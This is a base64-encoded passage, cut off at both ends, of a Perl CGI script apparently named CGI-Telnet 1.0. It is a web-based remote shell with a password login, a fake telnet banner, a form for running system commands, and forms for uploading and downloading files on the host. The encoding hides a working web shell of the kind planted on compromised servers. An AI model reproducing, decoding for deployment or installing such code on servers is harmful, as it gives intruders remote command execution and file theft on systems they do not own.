0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIFJlYWRzIHRoZSBpbnB1dCBzZW50IGJ5IHRoZSBicm93c2VyIGFuZCBwYXJzZXMgdGhlIGlucHV0IHZhcmlhYmxlcy4gSXQKIyBwYXJzZXMgR0VULCBQT1NUIGFuZCBtdWx0aXBhcnQvZm9ybS1kYXRhIHRoYXQgaXMgdXNlZCBmb3IgdXBsb2FkaW5nIGZpbGVzLgojIFRoZSBmaWxlbmFtZSBpcyBzdG9yZWQgaW4gJGlueydmJ30gYW5kIHRoZSBkYXRhIGlzIHN0b3JlZCBpbiAkaW57J2ZpbGVkYXRhJ30uCiMgT3RoZXIgdmFyaWFibGVzIGNhbiBiZSBhY2Nlc3NlZCB1c2luZyAkaW57J3Zhcid9LCB3aGVyZSB2YXIgaXMgdGhlIG5hbWUgb2YKIyB0aGUgdmFyaWFibGUuIE5vdGU6IE1vc3Qgb2YgdGhlIGNvZGUgaW4gdGhpcyBmdW5jdGlvbiBpcyB0YWtlbiBmcm9tIG90aGVyIENHSQojIHNjcmlwdHMuCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0Kc3ViIFJlYWRQYXJzZSAKewoJbG9jYWwgKCppbikgPSBAXyBpZiBAXzsKCWxvY2FsICgkaSwgJGxvYywgJGtleSwgJHZhbCk7CgkKCSRNdWx0aXBhcnRGb3JtRGF0YSA9ICRFTlZ7J0NPTlRFTlRfVFlQRSd9ID1+IC9tdWx0aXBhcnRcL2Zvcm0tZGF0YTsgYm91bmRhcnk9KC4rKSQvOwoKCWlmKCRFTlZ7J1JFUVVFU1RfTUVUSE9EJ30gZXEgIkdFVCIpCgl7CgkJJGluID0gJEVOVnsnUVVFUllfU1RSSU5HJ307Cgl9CgllbHNpZigkRU5WeydSRVFVRVNUX01FVEhPRCd9IGVxICJQT1NUIikKCXsKCQliaW5tb2RlKFNURElOKSBpZiAkTXVsdGlwYXJ0Rm9ybURhdGEgJiAkV2luTlQ7CgkJcmVhZChTVERJTiwgJGluLCAkRU5WeydDT05URU5UX0xFTkdUSCd9KTsKCX0KCgkjIGhhbmRsZSBmaWxlIHVwbG9hZCBkYXRhCglpZigkRU5WeydDT05URU5UX1RZUEUnfSA9fiAvbXVsdGlwYXJ0XC9mb3JtLWRhdGE7IGJvdW5kYXJ5PSguKykkLykKCXsKCQkkQm91bmRhcnkgPSAnLS0nLiQxOyAjIHBsZWFzZSByZWZlciB0byBSRkMxODY3IAoJCUBsaXN0ID0gc3BsaXQoLyRCb3VuZGFyeS8sICRpbik7IAoJCSRIZWFkZXJCb2R5ID0gJGxpc3RbMV07CgkJJEhlYWRlckJvZHkgPX4gL1xyXG5cclxufFxuXG4vOwoJCSRIZWFkZXIgPSAkYDsKCQkkQm9keSA9ICQnOwogCQkkQm9keSA9fiBzL1xyXG4kLy87ICMgdGhlIGxhc3QgXHJcbiB3YXMgcHV0IGluIGJ5IE5ldHNjYXBlCgkJJGlueydmaWxlZGF0YSd9ID0gJEJvZHk7CgkJJEhlYWRlciA9fiAvZmlsZW5hbWU9XCIoLispXCIvOyAKCQkkaW57J2YnfSA9ICQxOyAKCQkkaW57J2YnfSA9fiBzL1wiLy9nOwoJCSRpbnsnZid9ID1+IHMvXHMvL2c7CgoJCSMgcGFyc2UgdHJhaWxlcgoJCWZvcigkaT0yOyAkbGlzdFskaV07ICRpKyspCgkJeyAKCQkJJGxpc3RbJGldID1+IHMvXi4rbmFtZT0kLy87CgkJCSRsaXN0WyRpXSA9fiAvXCIoXHcrKVwiLzsKCQkJJGtleSA9ICQxOwoJCQkkdmFsID0gJCc7CgkJCSR2YWwgPX4gcy8oXihcclxuXHJcbnxcblxuKSl8KFxyXG4kfFxuJCkvL2c7CgkJCSR2YWwgPX4gcy8lKC4uKS9wYWNrKCJjIiwgaGV4KCQxKSkvZ2U7CgkJCSRpbnska2V5fSA9ICR2YWw7IAoJCX0KCX0KCWVsc2UgIyBzdGFuZGFyZCBwb3N0IGRhdGEgKHVybCBlbmNvZGVkLCBub3QgbXVsdGlwYXJ0KQoJewoJCUBpbiA9IHNwbGl0KC8mLywgJGluKTsKCQlmb3JlYWNoICRpICgwIC4uICQjaW4pCgkJewoJCQkkaW5bJGldID1+IHMvXCsvIC9nOwoJCQkoJGtleSwgJHZhbCkgPSBzcGxpdCgvPS8sICRpblskaV0sIDIpOwoJCQkka2V5ID1+IHMvJSguLikvcGFjaygiYyIsIGhleCgkMSkpL2dlOwoJCQkkdmFsID1+IHMvJSguLikvcGFjaygiYyIsIGhleCgkMSkpL2dlOwoJCQkkaW57JGtleX0gLj0gIlwwIiBpZiAoZGVmaW5lZCgkaW57JGtleX0pKTsKCQkJJGlueyRrZXl9IC49ICR2YWw7CgkJfQoJfQp9CgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgUHJpbnRzIHRoZSBIVE1MIFBhZ2UgSGVhZGVyCiMgQXJndW1lbnQgMTogRm9ybSBpdGVtIG5hbWUgdG8gd2hpY2ggZm9jdXMgc2hvdWxkIGJlIHNldAojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCnN1YiBQcmludFBhZ2VIZWFkZXIKewoJJEVuY29kZWRDdXJyZW50RGlyID0gJEN1cnJlbnREaXI7CgkkRW5jb2RlZEN1cnJlbnREaXIgPX4gcy8oW15hLXpBLVowLTldKS8nJScudW5wYWNrKCJIKiIsJDEpL2VnOwoJcHJpbnQgIkNvbnRlbnQtdHlwZTogdGV4dC9odG1sXG5cbiI7CglwcmludCA8PEVORDsKPGh0bWw+CjxoZWFkPgo8dGl0bGU+Q0dJLVRlbG5ldCBWZXJzaW9uIDEuMDwvdGl0bGU+CiRIdG1sTWV0YUhlYWRlcgo8L2hlYWQ+Cjxib2R5IG9uTG9hZD0iZG9jdW1lbnQuZi5AXy5mb2N1cygpIiBiZ2NvbG9yPSIjMDAwMDAwIiB0b3BtYXJnaW49IjAiIGxlZnRtYXJnaW49IjAiIG1hcmdpbndpZHRoPSIwIiBtYXJnaW5oZWlnaHQ9IjAiPgo8dGFibGUgYm9yZGVyPSIxIiB3aWR0aD0iMTAwJSIgY2VsbHNwYWNpbmc9IjAiIGNlbGxwYWRkaW5nPSIyIj4KPHRyPgo8dGQgYmdjb2xvcj0iI0MyQkZBNSIgYm9yZGVyY29sb3I9IiMwMDAwODAiIGFsaWduPSJjZW50ZXIiPgo8Yj48Zm9udCBjb2xvcj0iIzAwMDA4MCIgc2l6ZT0iMiI+IzwvZm9udD48L2I+PC90ZD4KPHRkIGJnY29sb3I9IiMwMDAwODAiPjxmb250IGZhY2U9IlZlcmRhbmEiIHNpemU9IjIiIGNvbG9yPSIjRkZGRkZGIj48Yj5DR0ktVGVsbmV0IFZlcnNpb24gMS4wIC0gQ29ubmVjdGVkIHRvICRTZXJ2ZXJOYW1lPC9iPjwvZm9udD48L3RkPgo8L3RyPgo8dHI+Cjx0ZCBjb2xzcGFuPSIyIiBiZ2NvbG9yPSIjQzJCRkE1Ij48Zm9udCBmYWNlPSJWZXJkYW5hIiBzaXplPSIyIj4KPGEgaHJlZj0iJFNjcmlwdExvY2F0aW9uP2E9dXBsb2FkJmQ9JEVuY29kZWRDdXJyZW50RGlyIj5VcGxvYWQgRmlsZTwvYT4gfCAKPGEgaHJlZj0iJFNjcmlwdExvY2F0aW9uP2E9ZG93bmxvYWQmZD0kRW5jb2RlZEN1cnJlbnREaXIiPkRvd25sb2FkIEZpbGU8L2E+IHwKPGEgaHJlZj0iJFNjcmlwdExvY2F0aW9uP2E9bG9nb3V0Ij5EaXNjb25uZWN0PC9hPiB8CjxhIGhyZWY9Imh0dHA6Ly93d3cucm9oaXRhYi5jb20vY2dpc2NyaXB0cy9jZ2l0ZWxuZXQuaHRtbCI+SGVscDwvYT4KPC9mb250PjwvdGQ+CjwvdHI+CjwvdGFibGU+Cjxmb250IGNvbG9yPSIjQzBDMEMwIiBzaXplPSIzIj4KRU5ECn0KCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KIyBQcmludHMgdGhlIExvZ2luIFNjcmVlbgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCnN1YiBQcmludExvZ2luU2NyZWVuCnsKCSRNZXNzYWdlID0gcSQ8cHJlPjxmb250IGNvbG9yPSIjNjY5OTk5Ij4gX19fX18gIF9fX19fICBfX19fXyAgICAgICAgICBfX19fXyAgICAgICAgXyAgICAgICAgICAgICAgIF8KLyAgX18gXHwgIF9fIFx8XyAgIF98ICAgICAgICB8XyAgIF98ICAgICAgfCB8ICAgICAgICAgICAgIHwgfAp8IC8gIFwvfCB8ICBcLyAgfCB8ICAgX19fX19fICAgfCB8ICAgIF9fXyB8IHwgXyBfXyAgICBfX18gfCB8Xwp8IHwgICAgfCB8IF9fICAgfCB8ICB8X19fX19ffCAgfCB8ICAgLyBfIFx8IHx8ICdfIFwgIC8gXyBcfCBfX3wKfCBcX18vXHwgfF9cIFwgX3wgfF8gICAgICAgICAgIHwgfCAgfCAgX18vfCB8fCB8IHwgfHwgIF9fL3wgfF8KIFxfX19fLyBcX19fXy8gXF9fXy8gICAgICAgICAgIFxfLyAgIFxfX198fF98fF98IHxffCBcX19ffCBcX198IDEuMAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAo8L2ZvbnQ+PGZvbnQgY29sb3I9IiNGRjAwMDAiPiAgICAgICAgICAgICAgICAgICAgICBfX19fX18gICAgICAgICAgICAgPC9mb250Pjxmb250IGNvbG9yPSIjQUU4MzAwIj7CqSAyMDAxLCBSb2hpdGFiIEJhdHJhPC9mb250Pjxmb250IGNvbG9yPSIjRkYwMDAwIj4KICAgICAgICAgICAgICAgICAgIC4tJnF1b3Q7ICAgICAgJnF1b3Q7LS4KICAgICAgICAgICAgICAgICAgLyAgICAgICAgICAgIFwKICAgICAgICAgICAgICAgICB8ICAgICAgICAgICAgICB8CiAgICAgICAgICAgICAgICAgfCwgIC4tLiAgLi0uICAsfAogICAgICAgICAgICAgICAgIHwgKShfby8gIFxvXykoIHwKICAgICAgICAgICAgICAgICB8LyAgICAgL1wgICAgIFx8CiAgICAgICAoQF8gICAgICAgKF8gICAgIF5eICAgICBfKQogIF8gICAgICkgXDwvZm9udD48Zm9udCBjb2xvcj0iIzgwODA4MCI+X19fX19fXzwvZm9udD48Zm9udCBjb2xvcj0iI0ZGMDAwMCI+XDwvZm9udD48Zm9udCBjb2xvcj0iIzgwODA4MCI+X188L2ZvbnQ+PGZvbnQgY29sb3I9IiNGRjAwMDAiPnxJSUlJSUl8PC9mb250Pjxmb250IGNvbG9yPSIjODA4MDgwIj5fXzwvZm9udD48Zm9udCBjb2xvcj0iI0ZGMDAwMCI+LzwvZm9udD48Zm9udCBjb2xvcj0iIzgwODA4MCI+X19fX19fX19fX19fX19fX19fX19fX18KPC9mb250Pjxmb250IGNvbG9yPSIjRkYwMDAwIj4gKF8pPC9mb250Pjxmb250IGNvbG9yPSIjODA4MDgwIj5AOEA4PC9mb250Pjxmb250IGNvbG9yPSIjRkYwMDAwIj57fTwvZm9udD48Zm9udCBjb2xvcj0iIzgwODA4MCI+Jmx0O19fX19fX19fPC9mb250Pjxmb250IGNvbG9yPSIjRkYwMDAwIj58LVxJSUlJSUkvLXw8L2ZvbnQ+PGZvbnQgY29sb3I9IiM4MDgwODAiPl9fX19fX19fX19fX19fX19fX19fX19fXyZndDs8L2ZvbnQ+PGZvbnQgY29sb3I9IiNGRjAwMDAiPgogICAgICAgIClfLyAgICAgICAgXCAgICAgICAgICAvIAogICAgICAgKEAgICAgICAgICAgIGAtLS0tLS0tLWAKICAgICAgICAgICAgIDwvZm9udD48Zm9udCBjb2xvcj0iI0FFODMwMCI+VyBBIFIgTiBJIE4gRzogUHJpdmF0ZSBTZXJ2ZXI8L2ZvbnQ+PC9wcmU+CiQ7CiMnCglwcmludCA8PEVORDsKPGNvZGU+ClRyeWluZyAkU2VydmVyTmFtZS4uLjxicj4KQ29ubmVjdGVkIHRvICRTZXJ2ZXJOYW1lPGJyPgpFc2NhcGUgY2hhcmFjdGVyIGlzIF5dCjxjb2RlPiRNZXNzYWdlCkVORAp9CgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgUHJpbnRzIHRoZSBtZXNzYWdlIHRoYXQgaW5mb3JtcyB0aGUgdXNlciBvZiBhIGZhaWxlZCBsb2dpbgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCnN1YiBQcmludExvZ2luRmFpbGVkTWVzc2FnZQp7CglwcmludCA8PEVORDsKPGNvZGU+Cjxicj5sb2dpbjogYWRtaW48YnI+CnBhc3N3b3JkOjxicj4KTG9naW4gaW5jb3JyZWN0PGJyPjxicj4KPC9jb2RlPgpFTkQKfQoKIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIFByaW50cyB0aGUgSFRNTCBmb3JtIGZvciBsb2dnaW5nIGluCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0Kc3ViIFByaW50TG9naW5Gb3JtCnsKCXByaW50IDw8RU5EOwo8Y29kZT4KPGZvcm0gbmFtZT0iZiIgbWV0aG9kPSJQT1NUIiBhY3Rpb249IiRTY3JpcHRMb2NhdGlvbiI+CjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImEiIHZhbHVlPSJsb2dpbiI+CmxvZ2luOiBhZG1pbjxicj4KcGFzc3dvcmQ6PGlucHV0IHR5cGU9InBhc3N3b3JkIiBuYW1lPSJwIj4KPGlucHV0IHR5cGU9InN1Ym1pdCIgdmFsdWU9IkVudGVyIj4KPC9mb3JtPgo8L2NvZGU+CkVORAp9CgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgUHJpbnRzIHRoZSBmb290ZXIgZm9yIHRoZSBIVE1MIFBhZ2UKIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpzdWIgUHJpbnRQYWdlRm9vdGVyCnsKCXByaW50ICI8L2ZvbnQ+PC9ib2R5PjwvaHRtbD4iOwp9CgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgUmV0cmVpdmVzIHRoZSB2YWx1ZXMgb2YgYWxsIGNvb2tpZXMuIFRoZSBjb29raWVzIGNhbiBiZSBhY2Nlc3NlcyB1c2luZyB0aGUKIyB2YXJpYWJsZSAkQ29va2llc3snJ30KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpzdWIgR2V0Q29va2llcwp7CglAaHR0cGNvb2tpZXMgPSBzcGxpdCgvOyAvLCRFTlZ7J0hUVFBfQ09PS0lFJ30pOwoJZm9yZWFjaCAkY29va2llKEBodHRwY29va2llcykKCXsKCQkoJGlkLCAkdmFsKSA9IHNwbGl0KC89LywgJGNvb2tpZSk7CgkJJENvb2tpZXN7JGlkfSA9ICR2YWw7Cgl9Cn0KCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KIyBQcmludHMgdGhlIHNjcmVlbiB3aGVuIHRoZSB1c2VyIGxvZ3Mgb3V0CiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0Kc3ViIFByaW50TG9nb3V0U2NyZWVuCnsKCXByaW50ICI8Y29kZT5Db25uZWN0aW9uIGNsb3NlZCBieSBmb3JlaWduIGhvc3QuPGJyPjxicj48L2NvZGU+IjsKfQoKIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIExvZ3Mgb3V0IHRoZSB1c2VyIGFuZCBhbGxvd3MgdGhlIHVzZXIgdG8gbG9naW4gYWdhaW4KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpzdWIgUGVyZm9ybUxvZ291dAp7CglwcmludCAiU2V0LUNvb2tpZTogU0FWRURQV0Q9O1xuIjsgIyByZW1vdmUgcGFzc3dvcmQgY29va2llCgkmUHJpbnRQYWdlSGVhZGVyKCJwIik7CgkmUHJpbnRMb2dvdXRTY3JlZW47CgkmUHJpbnRMb2dpblNjcmVlbjsKCSZQcmludExvZ2luRm9ybTsKCSZQcmludFBhZ2VGb290ZXI7Cn0KCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KIyBUaGlzIGZ1bmN0aW9uIGlzIGNhbGxlZCB0byBsb2dpbiB0aGUgdXNlci4gSWYgdGhlIHBhc3N3b3JkIG1hdGNoZXMsIGl0CiMgZGlzcGxheXMgYSBwYWdlIHRoYXQgYWxsb3dzIHRoZSB1c2VyIHRvIHJ1biBjb21tYW5kcy4gSWYgdGhlIHBhc3N3b3JkIGRvZW5zJ3QKIyBtYXRjaCBvciBpZiBubyBwYXNzd29yZCBpcyBlbnRlcmVkLCBpdCBkaXNwbGF5cyBhIGZvcm0gdGhhdCBhbGxvd3MgdGhlIHVzZXIKIyB0byBsb2dpbgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCnN1YiBQZXJmb3JtTG9naW4gCnsKCWlmKCRMb2dpblBhc3N3b3JkIGVxICRQYXNzd29yZCkgIyBwYXNzd29yZCBtYXRjaGVkCgl7CgkJcHJpbnQgIlNldC1Db29raWU6IFNBVkVEUFdEPSRMb2dpblBhc3N3b3JkO1xuIjsKCQkmUHJpbnRQYWdlSGVhZGVyKCJjIik7CgkJJlByaW50Q29tbWFuZExpbmVJbnB1dEZvcm07CgkJJlByaW50UGFnZUZvb3RlcjsKCX0KCWVsc2UgIyBwYXNzd29yZCBkaWRuJ3QgbWF0Y2gKCXsKCQkmUHJpbnRQYWdlSGVhZGVyKCJwIik7CgkJJlByaW50TG9naW5TY3JlZW47CgkJaWYoJExvZ2luUGFzc3dvcmQgbmUgIiIpICMgc29tZSBwYXNzd29yZCB3YXMgZW50ZXJlZAoJCXsKCQkJJlByaW50TG9naW5GYWlsZWRNZXNzYWdlOwoJCX0KCQkmUHJpbnRMb2dpbkZvcm07CgkJJlByaW50UGFnZUZvb3RlcjsKCX0KfQoKIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIFByaW50cyB0aGUgSFRNTCBmb3JtIHRoYXQgYWxsb3dzIHRoZSB1c2VyIHRvIGVudGVyIGNvbW1hbmRzCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0Kc3ViIFByaW50Q29tbWFuZExpbmVJbnB1dEZvcm0KewoJJFByb21wdCA9ICRXaW5OVCA/ICIkQ3VycmVudERpcj4gIiA6ICJbYWRtaW5cQCRTZXJ2ZXJOYW1lICRDdXJyZW50RGlyXVwkICI7CglwcmludCA8PEVORDsKPGNvZGU+Cjxmb3JtIG5hbWU9ImYiIG1ldGhvZD0iUE9TVCIgYWN0aW9uPSIkU2NyaXB0TG9jYXRpb24iPgo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJhIiB2YWx1ZT0iY29tbWFuZCI+CjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImQiIHZhbHVlPSIkQ3VycmVudERpciI+CiRQcm9tcHQKPGlucHV0IHR5cGU9InRleHQiIG5hbWU9ImMiPgo8aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iRW50ZXIiPgo8L2Zvcm0+CjwvY29kZT4KRU5ECn0KCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KIyBQcmludHMgdGhlIEhUTUwgZm9ybSB0aGF0IGFsbG93cyB0aGUgdXNlciB0byBkb3dubG9hZCBmaWxlcwojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCnN1YiBQcmludEZpbGVEb3dubG9hZEZvcm0KewoJJFByb21wdCA9ICRXaW5OVCA/ICIkQ3VycmVudERpcj4gIiA6ICJbYWRtaW5cQCRTZXJ2ZXJOYW1lICRDdXJyZW50RGlyXVwkICI7CglwcmludCA8PEVORDsKPGNvZGU+Cjxmb3JtIG5hbWU9ImYiIG1ldGhvZD0iUE9TVCIgYWN0aW9uPSIkU2NyaXB0TG9jYXRpb24iPgo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJkIiB2YWx1ZT0iJEN1cnJlbnREaXIiPgo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJhIiB2YWx1ZT0iZG93bmxvYWQiPgokUHJvbXB0IGRvd25sb2FkPGJyPjxicj4KRmlsZW5hbWU6IDxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJmIiBzaXplPSIzNSI+PGJyPjxicj4KRG93bmxvYWQ6IDxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSJCZWdpbiI+CjwvZm9ybT4KPC9jb2RlPgpFTkQKfQoKIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIFByaW50cyB0aGUgSFRNTCBmb3JtIHRoYXQgYWxsb3dzIHRoZSB1c2VyIHRvIHVwbG9hZCBmaWxlcwojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCnN1YiBQcmludEZpbGVVcGxvYWRGb3JtCnsKCSRQcm9tcHQgPSAkV2luTlQgPyAiJEN1cnJlbnREaXI+ICIgOiAiW2FkbWluXEAkU2VydmVyTmFtZSAkQ3VycmVudERpcl1cJCAiOwoJcHJpbnQgPDxFTkQ7Cjxjb2RlPgo8Zm9ybSBuYW1lPSJmIiBlbmN0eXBlPSJtdWx0aXBhcnQvZm9ybS1kYXRhIiBtZXRob2Q9IlBPU1QiIGFjdGlvbj0iJFNjcmlwdExvY2F0aW9uIj4KJFByb21wdCB1cGxvYWQ8YnI+PGJyPgpGaWxlbmFtZTogPGlucHV0IHR5cGU9ImZpbGUiIG5hbWU9ImYiIHNpemU9IjM1Ij48YnI+PGJyPgpPcHRpb25zOiAmbmJzcDs8aW5wdXQgdHlwZT0iY2hlY2tib3giIG5hbWU9Im8iIHZhbHVlPSJvdmVyd3JpdGUiPgpPdmVyd3JpdGUgaWYgaXQgRXhpc3RzPGJyPjxicj4KVXBsb2FkOiZuYnNwOyZuYnNwOyZuYnNwOzxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSJCZWdpbiI+CjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImQiIHZhbHVlPSIkQ3VycmVudERpciI+CjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImEiIHZhbHVlPSJ1cGxvYWQiPgo8L2Zvcm0+CjwvY29kZT4KRU5ECn0KCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KIyBUaGlzIGZ1bmN0aW9uIGlzIGNhbGxlZCB3aGVuIHRoZSB0aW1lb3V0IGZvciBhIGNvbW1hbmQgZXhwaXJlcy4gV2UgbmVlZCB0bwojIHRlcm1pbmF0ZSB0aGUgc2NyaXB0IGltbWVkaWF0ZWx5LiBUaGlzIGZ1bmN0aW9uIGlzIHZhbGlkIG9ubHkgb24gVW5peC4gSXQgaXMKIyBuZXZlciBjYWxsZWQgd2hlbiB0aGUgc2NyaXB0IGlzIHJ1bm5pbmcgb24gTlQuCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0Kc3ViIENvbW1hbmRUaW1lb3V0CnsKCWlmKCEkV2luTlQpCgl7CgkJYWxhcm0oMCk7CgkJcHJpbnQgPDxFTkQ7CjwveG1wPgo8Y29kZT4KQ29tbWFuZCBleGNlZWRlZCBtYXhpbXVtIHRpbWUgb2YgJENvbW1hbmRUaW1lb3V0RHVyYXRpb24gc2Vjb25kKHMpLgo8YnI+S2lsbGVkIGl0IQo8Y29kZT4KRU5ECgkJJlByaW50Q29tbWFuZExpbmVJbnB1dEZvcm07CgkJJlByaW50UGFnZUZvb3RlcjsKCQlleGl0OwoJfQp9CgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgVGhpcyBmdW5jdGlvbiBpcyBjYWxsZWQgdG8gZXhlY3V0ZSBjb21tYW5kcy4gSXQgZGlzcGxheXMgdGhlIG91dHB1dCBvZiB0aGUKIyBjb21tYW5kIGFuZCBhbGxvd3MgdGhlIHVzZXIgdG8gZW50ZXIgYW5vdGhlciBjb21tYW5kLiBUaGUgY2hhbmdlIGRpcmVjdG9yeQojIGNvbW1hbmQgaXMgaGFuZGxlZCBkaWZmZXJlbnRseS4gSW4gdGhpcyBjYXNlLCB0aGUgbmV3IGRpcmVjdG9yeSBpcyBzdG9yZWQgaW4KIyBhbiBpbnRlcm5hbCB2YXJpYWJsZSBhbmQgaXMgdXNlZCBlYWNoIHRpbWUgYSBjb21tYW5kIGhhcyB0byBiZSBleGVjdXRlZC4gVGhlCiMgb3V0cHV0IG9mIHRoZSBjaGFuZ2UgZGlyZWN0b3J5IGNvbW1hbmQgaXMgbm90IGRpc3BsYXllZCB0byB0aGUgdXNlcnMKIyB0aGVyZWZvcmUgZXJyb3IgbWVzc2FnZXMgY2Fubm90IGJlIGRpc3BsYXllZC4KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpzdWIgRXhlY3V0ZUNvbW1hbmQKewoJaWYoJFJ1bkNvbW1hbmQgPX4gbS9eXHMqY2RccysoLispLykgIyBpdCBpcyBhIGNoYW5nZSBkaXIgY29tbWFuZAoJewoJCSMgd2UgY2hhbmdlIHRoZSBkaXJlY3RvcnkgaW50ZXJuYWxseS4gVGhlIG91dHB1dCBvZiB0aGUKCQkjIGNvbW1hbmQgaXMgbm90IGRpc3BsYXllZC4KCQkKCQkkT2xkRGlyID0gJEN1cnJlbnREaXI7CgkJJENvbW1hbmQgPSAiY2QgXCIkQ3VycmVudERpclwiIi4kQ21kU2VwLiJjZCAkMSIuJENtZFNl